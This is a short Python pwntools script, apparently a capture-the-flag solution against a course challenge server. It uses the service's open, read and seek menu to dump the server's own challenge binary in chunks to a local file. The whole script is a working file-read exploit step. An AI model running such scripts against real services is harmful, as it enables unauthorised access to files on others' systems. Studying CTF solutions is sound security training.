from pwn import *

output = open("ch", "wb")
r = remote('edu-ctf.zoolab.org',10001)
r.sendlineafter(b'5. seek\n','1')
r.sendline('/home/chal/chal')
r.sendlineafter(b'5. seek\n','2')
r.sendlineafter(b'5. seek\n','3')

output.write(r.recvuntil(b'1.')[2:-2])
for i in range(100,170):
    r.sendlineafter(b'5. seek\n','5')
    r.sendline(str(i*100+100))
    r.sendlineafter(b'5. seek\n','2')
    r.sendlineafter(b'5. seek\n','3')
    output.write(r.recvuntil(b'1.')[2:-2])


print('##############################')
print('done')
print('##############################')






